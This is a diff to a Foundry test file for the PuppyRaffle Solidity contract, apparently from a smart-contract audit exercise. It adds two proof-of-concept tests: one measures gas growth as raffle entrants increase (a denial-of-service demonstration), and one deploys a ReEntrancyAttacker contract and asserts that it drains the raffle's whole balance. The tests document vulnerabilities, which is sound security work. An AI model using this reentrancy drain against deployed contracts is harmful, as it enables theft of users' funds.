@@ -4,6 +4,7 @@ pragma experimental ABIEncoderV2;
 
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+import {ReEntrancyAttacker} from "../src/ReEntrancyAttacker.sol";
 
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
@@ -75,6 +76,31 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
     }
 
+    function test_denialOfService() public {
+
+        vm.txGasPrice(1);
+        uint256 playersNum = 100;
+        address[][] memory listOfPlayerAddress = new address[][](2);
+
+        for (uint256 i = 0; i < 2; i++){
+            listOfPlayerAddress[i] = new address[](playersNum);
+            for (uint256 j = 0; j < playersNum; j++){
+                listOfPlayerAddress[i][j] = address(j + playersNum);
+            }
+            
+            uint256 gasStart = gasleft();
+            puppyRaffle.enterRaffle{value: entranceFee * listOfPlayerAddress[i].length}(listOfPlayerAddress[i]);
+            uint256 gasEnd = gasleft();
+
+            uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
+
+            console.log("Gas cost for %s00 players: %d ", i+1, gasUsedFirst);
+
+            playersNum += 100;
+        }
+    }
+
+
     //////////////////////
     /// Refund         ///
     /////////////////////
@@ -109,6 +135,32 @@ contract PuppyRaffleTest is Test {
         vm.expectRevert("PuppyRaffle: Only the player can refund");
         vm.prank(playerTwo);
         puppyRaffle.refund(indexOfPlayer);
+    }
+
+    function test_reenter() public {
+        address[] memory players = new address[](100);
+
+        for (uint256 i = 0; i < 100; i++){
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * 100 }(players);
+        
+        console.log("Starting Puppy Raffle balance: ", address(puppyRaffle).balance );
+        assertEq(address(puppyRaffle).balance, entranceFee * 100);
+
+        ReEntrancyAttacker reEntrancyAttack = new ReEntrancyAttacker(puppyRaffle);
+        vm.deal(address(reEntrancyAttack), 1e18);
+
+        console.log("Starting Attacker balance: ", address(reEntrancyAttack).balance );
+
+        reEntrancyAttack.attack(puppyRaffle);
+
+        console.log("Ending Puppy Raffle balance: ", address(puppyRaffle).balance );
+        console.log("Ending Attacker balance: ", address(reEntrancyAttack).balance );
+
+        assertEq(address(puppyRaffle).balance, 0);
+        assertEq(address(reEntrancyAttack).balance, 1e18 + entranceFee * 100);
+
     }
 
     //////////////////////
